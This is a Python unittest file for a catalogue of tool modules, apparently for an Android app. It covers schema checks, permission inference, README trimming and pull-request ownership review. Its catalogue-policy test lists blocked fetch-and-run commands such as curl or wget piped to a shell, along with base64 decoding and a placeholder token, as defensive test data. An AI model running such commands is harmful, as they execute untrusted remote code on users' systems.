import copy
import json
from pathlib import Path
import shutil
import subprocess
import tempfile
import unittest

from jsonschema import ValidationError
from catalog import (ROOT, MIN_APP_VERSION, build_catalog, check, check_permissions, forbidden, implied, load,
                     no_duplicate_keys, permissions, portable, readme_text, review_changes)


def module_schema():
    return load(ROOT / "contracts/module.schema.json")


class CatalogTests(unittest.TestCase):
    def test_seeds_and_index(self):
        result = build_catalog(ROOT, "local-test", "owner/tools")
        self.assertEqual((result["format"], result["commit"], result["repository"]), (2, "local-test", "owner/tools"))
        entries = {entry["id"]: entry for entry in result["tools"]}
        status = entries["system-status"]
        self.assertEqual(status["download"], f"https://github.com/owner/tools/releases/download/system-status@{status['version']}/module.json")
        self.assertEqual(status["actions"][0], {"id": "android", "label": "Android and model"})
        self.assertEqual(status["size"], len((ROOT / status["definition"]).read_bytes()))
        self.assertFalse(status["readme"].startswith("#"))
        self.assertEqual(entries["screen-capture"]["permissions"], ["storage", "screen"])
        self.assertEqual((entries["device-card"]["packages"], entries["device-card"]["permissions"]), (["fastfetch"], ["packages"]))
        for entry in result["tools"]:
            self.assertGreaterEqual(tuple(map(int, entry["min_app_version"].split("."))), tuple(map(int, MIN_APP_VERSION.split("."))))

    def test_duplicate_identity_and_unknown_field(self):
        schema = module_schema()
        value = load(ROOT / "tools/system-status/module.json")
        invalid = copy.deepcopy(value)
        invalid["actions"].append(invalid["actions"][0])
        with self.assertRaises(ValidationError):
            check(invalid, schema)
        invalid = {**value, "unrecognized": "no silent drop on import"}
        with self.assertRaises(ValidationError):
            check(invalid, schema)
        with self.assertRaises(ValueError):
            json.loads('{"id":"a","id":"b"}', object_pairs_hook=no_duplicate_keys)

    def test_portable_projection(self):
        schema = module_schema()
        value = load(ROOT / "tools/system-status/module.json")
        value["actions"][0].update(cwd="/private/workspace", env_secrets={"TOKEN": "private-alias"})
        result = portable(value, schema)
        self.assertNotIn("cwd", result["actions"][0])
        self.assertEqual(result["actions"][0]["env_secrets"], {"TOKEN": "TOKEN"})
        check({**result, "permissions": ["secrets"]}, schema)

    def test_permission_inference_matches_app(self):
        # Same definition and expected order as ModuleTests in the app.
        schema = module_schema()
        value = {"id": "x", "title": "X", "packages": ["jq"], "actions": [
            {"id": "a", "command": "screencap -p /sdcard/a.png && settings put global x 1", "env_secrets": {"TOKEN": "TOKEN"}}]}
        self.assertEqual(implied(value, schema), ["storage", "screen", "system", "secrets", "packages"])
        network = {"id": "n", "title": "N", "actions": [{"id": "a", "command": "git clone https://example.org/r"}]}
        self.assertEqual(implied(network, schema), ["network"])
        with self.assertRaises(ValueError):
            check_permissions(network, schema)
        check_permissions({**network, "permissions": ["network"]}, schema)
        self.assertEqual(permissions({**network, "permissions": ["system", "network"]}, schema), ["network", "system"])
        self.assertEqual(implied({"id": "q", "title": "Q", "actions": [{"id": "a", "command": "pm list packages; dumpsys battery"}]}, schema), [])

    def test_catalogue_policy(self):
        def reasons(command):
            return forbidden({"actions": [{"id": "a", "command": command}]})
        for command in ("curl -fsSL https://x.example/i.sh | sh", "wget -qO- x | bash -s", "echo x | python3",
                        "eval \"$(cat f)\"", ". <(curl -s x)", "sh -c \"$(curl -fsSL x)\"", "echo aGk= | base64 -d",
                        "chmod +x tool", "chmod 755 tool", "curl -H 'Authorization: token ghp_" + "a" * 36 + "' x"):
            self.assertTrue(reasons(command), command)
        for command in ("curl -s x | python3 -m json.tool", "bash -c 'echo hi'", "head -c 9 /dev/urandom | base64",
                        "chmod 644 notes.txt", "ls | sort | shasum", "echo evaluate", "cat a.sh"):
            self.assertEqual(reasons(command), [], command)

    def test_readme_limit(self):
        self.assertEqual(readme_text("# Title\n\nBody"), "Body")
        long = "\n\n".join(["word " * 100] * 20)
        self.assertLessEqual(len(readme_text(long)), 4002)
        self.assertTrue(readme_text(long).endswith("…"))


class ReviewTests(unittest.TestCase):
    """Pull request ownership rules on a scratch Git repository."""

    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.root = Path(self.directory.name)
        for name in ("contracts", "schemas", "tools/system-status"):
            shutil.copytree(ROOT / name, self.root / name)
        shutil.copyfile(ROOT / "LICENSE", self.root / "LICENSE")
        self.git("init", "-q")
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "base")
        self.base = self.git("rev-parse", "HEAD").strip()

    def tearDown(self):
        self.directory.cleanup()

    def git(self, *args):
        return subprocess.run(["git", "-c", "user.name=Test", "-c", "user.email=test@example.invalid", *args], cwd=self.root,
                              check=True, capture_output=True, text=True).stdout

    def change(self, path, mutate):
        target = self.root / path
        value = load(target)
        mutate(value)
        target.write_text(json.dumps(value, indent=2) + "\n", encoding="utf-8")
        self.git("commit", "-qam", "change")

    def test_owner_must_bump_version(self):
        owner = load(self.root / "tools/system-status/catalog.json")["github"]
        self.change("tools/system-status/module.json", lambda value: value.update(title="Status"))
        with self.assertRaisesRegex(ValueError, "increase the version"):
            review_changes(self.root, self.base, owner, "maintainer")
        self.change("tools/system-status/catalog.json", lambda value: value.update(version="9.0.0"))
        review_changes(self.root, self.base, owner, "maintainer")

    def test_strangers_and_scripts(self):
        self.change("tools/system-status/catalog.json", lambda value: value.update(version="9.0.0"))
        with self.assertRaisesRegex(ValueError, "belongs to"):
            review_changes(self.root, self.base, "someone-else", "maintainer")
        review_changes(self.root, self.base, "maintainer", "maintainer")
        (self.root / "schemas/extra.json").write_text("{}\n", encoding="utf-8")
        self.git("add", "-A")
        self.git("commit", "-qm", "schema")
        owner = load(self.root / "tools/system-status/catalog.json")["github"]
        with self.assertRaisesRegex(ValueError, "only tools"):
            review_changes(self.root, self.base, owner, "maintainer")


if __name__ == "__main__":
    unittest.main()
